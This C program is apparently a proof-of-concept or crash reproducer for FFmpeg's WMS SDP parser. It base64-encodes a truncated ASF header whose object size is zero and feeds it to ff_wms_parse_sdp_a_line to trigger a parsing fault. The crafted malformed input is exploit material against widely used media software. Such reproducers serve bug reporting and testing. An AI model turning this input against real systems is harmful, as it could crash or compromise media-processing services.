#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "libavformat/avformat.h"
#include "libavformat/rtpdec_formats.h"
#include "libavformat/rtsp.h"
#include "libavutil/base64.h"
#include "libavutil/mem.h"

int main(void)
{
    static const uint8_t asf_header[16] = {
        0x30, 0x26, 0xB2, 0x75, 0x8E, 0x66, 0xCF, 0x11,
        0xA6, 0xD9, 0x00, 0xAA, 0x00, 0x62, 0xCE, 0x6C,
    };
    uint8_t decoded[54] = { 0 };
    char encoded[AV_BASE64_SIZE(sizeof(decoded))];
    char line[160];
    AVFormatContext *format = avformat_alloc_context();
    int ret;

    if (!format)
        return 2;
    format->priv_data = av_mallocz(sizeof(RTSPState));
    if (!format->priv_data)
        return 2;

    memcpy(decoded, asf_header, sizeof(asf_header));
    if (!av_base64_encode(encoded, sizeof(encoded), decoded, sizeof(decoded)))
        return 2;
    snprintf(line, sizeof(line),
             "pgmpu:data:application/vnd.ms.wms-hdr.asfv1;base64,%s", encoded);

    printf("decoded_len=%zu object_offset=30 object_size=0 "
           "entering=ff_wms_parse_sdp_a_line\n",
           sizeof(decoded));
    fflush(stdout);
    ret = ff_wms_parse_sdp_a_line(format, line);
    printf("returned=%d\n", ret);
    fflush(stdout);
    return 0;
}
